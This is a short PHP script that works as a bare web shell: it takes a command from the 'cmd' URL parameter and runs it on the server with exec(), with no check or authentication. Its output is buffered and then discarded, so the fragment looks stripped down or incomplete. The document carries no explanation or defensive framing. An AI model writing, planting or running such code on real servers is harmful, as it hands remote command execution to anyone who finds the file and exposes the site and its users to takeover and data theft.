<?php
function execute($com)
{
  if(function_exists('exec'))
  {
    exec($com,$arr);
    echo implode('',$arr);
  }
}

$cmd = $_GET['cmd'];
ob_start();
execute($cmd);
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
?>